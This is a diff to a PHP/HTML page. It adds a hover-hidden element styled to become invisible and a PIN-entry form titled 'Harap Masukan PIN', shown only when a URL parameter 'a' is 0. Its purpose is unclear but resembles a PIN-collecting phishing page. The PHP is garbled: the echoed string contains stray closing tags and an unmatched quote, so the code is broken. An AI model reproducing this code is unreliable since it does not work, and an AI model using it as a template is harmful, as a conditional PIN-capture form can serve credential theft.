@@ -36,6 +36,17 @@
     opacity: 1;
     margin: 10px 0;
   }
+  #budi {
+    cursor: default;
+  }
+  #budi:hover,#budi:visited,#budi:active {
+    opacity: 0;
+    cursor: default;
+    pointer-events: none;
+  }
+  #budi:before{
+    cursor: default;
+  }
   </style>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -47,10 +58,15 @@
 <div class="wrapper" style="margin: 0;">
 
   <div class="content-wrapper" style="">
+<?php
 
+$a=$_GET['a'];
+if($a==0){
+echo"
+?>
     <div class="parent-div">
       <div class="example-div">
-        <form method="post" action="index2.php">
+        <form method="post" action="index2.html">
           <div class="head-card">Harap Masukan PIN</div>
           <div class="pin-form">
             <input type="text" name="1" min="0" maxlength="1" style="font-size: 30px;text-align: center;width: 50px;border-radius: 5px;height: 50px;"></input>
@@ -66,6 +82,12 @@
         </form>
       </div>
     </div>
+<?php
+";"
+}else{
+  echo "AAA";
+}
+?>
   </div>
 
 </div>
